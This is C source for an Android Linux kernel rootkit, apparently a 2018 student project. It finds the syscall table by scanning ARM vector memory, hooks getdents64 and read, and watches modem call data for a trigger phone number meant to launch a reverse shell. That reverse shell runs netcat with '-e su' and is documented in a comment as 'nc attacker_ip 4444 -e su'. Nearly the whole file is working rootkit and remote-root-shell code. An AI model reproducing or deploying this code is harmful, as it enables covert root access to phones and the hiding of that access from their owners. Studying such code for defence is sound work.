/*
  Hadrien Amrouche, Nicolas Grellety, Bowen Liu, Roland Mounier
  
  (c) 2018
  End of studies' project based on "Android platform based linux kernel rootkit".
*/
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/dirent.h> // getdents
#include <linux/string.h> // strstr, strcmp
#include <linux/types.h>  // size_t
#include <linux/unistd.h> // read, getuid


unsigned long *sys_call_table = 0;

asmlinkage int (*og_getdents64) (int fd,
                                struct linux_dirent64 *dirp,
                                unsigned int count);
asmlinkage ssize_t (*og_read) (int fd, char *buf, size_t count);


asmlinkage int
hooked_getdents64(int fd,
                struct linux_dirent64 *dirp,
                unsigned int count) {
  printk(KERN_INFO "Should not be here\n");
  return og_getdents64(fd, dirp, count);
}

asmlinkage ssize_t
hooked_read(int fd, char *buf, size_t count)
{
  if (strstr(buf, "CLCC") != NULL) {
    if (strstr(buf, "6505551212") != NULL) {
      printk(KERN_INFO "Trigger call\n");
      // reverse_shell();
    }
  }
  return og_read(fd, buf, count);
}

void
reverse_shell(void)
{
  /** 
   * Hack with netcat! 
   * Attacker side $ nc -lvp 4444
   * Device side $ nc attacker_ip 4444 -e su &
   */
  char *nc_path = "/system/xbin/nc";
  char *args[] = {
    "/system/xbin/nc", 
    "127.0.0.1",
    "4444", 
    "-e",
    "/system/xbin/su",
    "&",
    NULL
  };
  
  char *env_path[] = {
    "HOME=/",
    "PATH=/sbin:/system/sbin:/system/bin:/system/xbin",
    NULL
  };

  call_usermodehelper(nc_path, args, env_path, 1);
}

void
get_sys_call_table(void)
{
  void *swi_addr = (long *)0xffff0008;
  unsigned long offset = 0;
  unsigned long *vector_swi_addr = 0;

  offset = ((*(long *)swi_addr) & 0xfff) + 8;
  vector_swi_addr = *(unsigned long *)(swi_addr + offset);

  while (vector_swi_addr++) {
    if (((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000) {
      offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
      sys_call_table = (void *)vector_swi_addr + offset;
      printk(KERN_INFO "syscall table found at %p\n", sys_call_table);
      break;
      }
  }
  return;
}

static int __init
rootkit_init(void) 
{
  /* We could use grep sys_call System.map */
  get_sys_call_table();
  if (sys_call_table == 0x0)
    return -1; 

  og_getdents64 = sys_call_table[__NR_getdents64];
  og_read = sys_call_table[__NR_read];

  sys_call_table[__NR_getdents64] = hooked_getdents64;
  sys_call_table[__NR_read] = hooked_read;
  return 0;
}

static int __exit
rootkit_exit(void)
{
  sys_call_table[__NR_getdents64] = og_getdents64;
  sys_call_table[__NR_read] = og_read;
  return 0;
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Master CSI");
MODULE_DESCRIPTION("Simple Rootkit for Android");

